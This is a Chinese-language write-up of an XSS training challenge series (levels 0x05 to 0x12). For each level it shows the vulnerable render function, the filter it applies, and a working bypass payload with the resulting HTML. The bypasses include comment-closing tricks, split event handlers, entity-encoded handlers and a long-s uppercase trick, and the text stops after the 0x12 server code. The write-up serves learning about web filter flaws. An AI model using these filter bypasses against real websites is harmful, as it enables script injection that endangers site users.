<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关将html中的注释符<code>--&gt;</code>替换成了一个表情，并且输入的内容是包含在一段注释符里的。</p>
<p>html通常的的注释符为：<code>&lt;!-- --&gt;</code>，测试发现<code>&lt;!- -!&gt;</code>、<code>&lt;!-- --!&gt;</code>同样可以进行注释，这里可利用<code>--!&gt;</code>来闭合。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">--!&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; --&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了以<code>auto</code>、<code>on</code>开头，<code>=</code>结尾的标签属性，并用下划线<code>_</code>进行替换，同时忽略大小写。</p>
<p>可以用换行使onxxx不和=连接，这样就可以避免被过滤。<a href="https://m.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件</a></p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onclick</td>
<td align="center">当用户点击某个对象时调用的事件句柄</td>
</tr>
<tr>
<td align="center">onfocus</td>
<td align="center">元素获取焦点时触发</td>
</tr>
<tr>
<td align="center">onmouseover</td>
<td align="center">鼠标移到某元素之上</td>
</tr>
</tbody></table>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onfocus</span><br><span class="line">=alert(1)  需要鼠标点击框</span><br><span class="line"></span><br><span class="line">onclick</span><br><span class="line">=alert(1)  需要鼠标点击框</span><br><span class="line"></span><br><span class="line">onmouseover</span><br><span class="line">=alert(1)  需要鼠标放在框上</span><br><span class="line"></span><br><span class="line">type=image src=# onerror</span><br><span class="line">=alert(1)  直接弹</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">onmouseover</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span></span></span><br><span class="line"><span class="tag"> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则匹配了以<code>&lt;</code>或<code>&lt;/</code>开头，<code>&gt;</code>或<code>/&gt;</code>结尾的标签，并替换为空。<br>去掉最后面的<code>&gt;</code>利用浏览器容错性运行</p>
<p><strong>input code:</strong>(第一个最后还有个空格或回车用来中断属性值)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> </span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;img src=# onerror=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;article&gt;&lt;img src=&quot;x&quot; onerror=alert(1) &lt;/article&gt;</span><br><span class="line">    </span><br><span class="line">&lt;article&gt;&lt;img src=# onerror=&quot;alert(1)&quot;&lt;/article&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>&lt;/style&gt;</code>标签，忽略大小写。</p>
<p>因为我们需要用到<code>&lt;/style&gt;</code>来闭合标签，所以可以通过空格进行绕过。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">      &lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求输入的值要以<code>https://www.segmentfault.com</code>开头，否则返回<code>Invalid URL</code>但是并没有限制结尾，所以闭合掉<code>&lt;script&gt;</code>标签</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)</span></span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.segmentfault.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样要求输入的值要以<code>https://www.segmentfault.com</code>开头，但是过滤了<code>&amp; &#39; &quot; &lt; &gt; /</code>，这个过滤。</p>
<p>前面给出的包含alert(1);的js文件就派上用场了。</p>
<p><img src="https://img.vim-cn.com/58/fb7123f5bdf3b2948b5e557755267ae58ff909.png" alt="p6"></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将输入值全部转换成了大写。</p>
<ul>
<li>html标签不区分；</li>
<li>域名不区分大小写</li>
<li>js严格区分大小写。</li>
</ul>
<p>因此这里可以利用html标签引用外部js资源，但是这里引用前面给的<a href="https://xss.haozi.me/j.js%E8%BF%98%E6%98%AF%E4%B8%8D%E8%A1%8C%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%AE%98%E6%96%B9%E8%A7%A3%E7%AD%94%EF%BC%8C%E9%9C%80%E8%A6%81%E5%BC%95%E7%94%A8https://www.segmentfault.com.haozi.me/j.js%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E6%89%8D%E8%A1%8C%E2%80%A6%E6%97%A0%E8%AF%AD%E3%80%82">https://xss.haozi.me/j.js还是不行，根据官方解答，需要引用https://www.segmentfault.com.haozi.me/j.js这个链接才行…无语。</a></p>
<p>这里也可利用编码来进行绕过，对js代码进行编码处理, 而html部分不变</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;X&quot;</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将script替换为空，正则全局匹配且不区分大小写.</p>
<p>这里可以直接用上一题的payload…也可以双写script，引用外部js资源，同样还是需要引用<a href="https://www.segmentfault.com.haozi.me/j.js%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E6%89%8D%E8%A1%8C%E2%80%A6">https://www.segmentfault.com.haozi.me/j.js这个链接才行…</a></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;X&quot;</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>&lt; / &quot; &#39;</code>，但input的地方前面有个//，这是js的单行注释符，可以通过换行来破坏，然后再用<code>--&gt;</code>将后面的<code>&#39;)</code>注释掉。<code>&lt;!--</code>和<code>--&gt;</code>都可以在html的<code>script</code>标签里单独使用进行单行注释.，这里<code>&lt;</code>被过滤了，所以使用<code>--&gt;</code></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// alert(&#x27;</span></span></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;&#x27;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>匹配以<code>&lt;</code>起始的字符，替换为<code>&lt;_$1</code>，并且把输入转换为大写，这样这样的标签就都用不了了。</p>
<p>有一个<code>ſ</code>字符，是古英语中<code>s</code>的写法，ſ<code>转换为大写后正好为</code>S<code>，这样就可以绕过正则使用</code><script>`标签引如外部js</p>
<p><img src="https://img.vim-cn.com/c9/50e3965a99573b9b6cfe500887a4d64287def6.png" alt="p7"></p>
<p><img src="https://img.vim-cn.com/fd/162d35a3d88ab40ad41fa5146383d9cd612ee2.png" alt="p8"></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src οnerrοr=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>&amp; &#39; &quot; &lt; &gt; /</code>，转换为了html实体编码，但是由于input code在img标签内，所以html实体编码是可以被直接解析的。<br>所以闭合前面的标签，在构造语句即可。</p>
<p>console.error() 方法用于输出错误信息到控制台。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;<span class="symbol">&amp;#39;</span>);alert(<span class="symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">实际上就是</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;&#x27;);alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于input是在script标签里面，且没有任何过滤，所以直接用；闭合前面的语句，构造下一条语句即可。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1;alert(1)</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.data = <span class="number">1</span>;alert(<span class="number">1</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用反斜杠转义了一堆字符，但是<code>&quot;</code>被转义成<code>\&quot;</code>正好可以闭合<code>console.log(&quot;\&quot;)</code>，既然闭合了前面的语句那么之后就构造后面的语句就行了。</p>
<p>console.log() 方法用于在控制台输出信息。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;),alert(1)(&quot;</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> url = <span class="string">&#x27;javascript:console.log(&quot;\&quot;),alert(1)(\&quot;&quot;)&#x27;</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span></span><br><span class="line">  a.href = url</span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(a)</span></span><br><span class="line">  a.click()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

